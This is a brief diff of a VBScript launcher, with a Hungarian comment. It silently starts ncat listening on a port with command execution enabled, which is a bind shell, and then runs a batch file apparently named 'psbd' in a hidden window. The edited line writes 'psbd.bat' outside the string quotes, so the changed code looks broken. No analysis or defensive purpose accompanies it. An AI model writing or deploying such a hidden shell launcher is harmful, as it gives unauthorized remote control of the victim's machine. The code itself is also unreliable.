@@ -45,6 +45,7 @@ fullCommand = "cmd /c start """" /B """ & NCAT_PATH & """ -l -p " & PORT & " -e 
 ' False = A VBScript nem várja meg, amíg a parancs befejeződik, hanem azonnal kilép.
 shell.Run fullCommand, 0, False
 
-shell.Run "cmd /c start """" /B """ & basedir & "\" & psbd & """", 0, False
+shell.Run "cmd /c start """" /B """ & basedir & "\" & psbd.bat & """", 0, False
 
 Set shell = Nothing
+
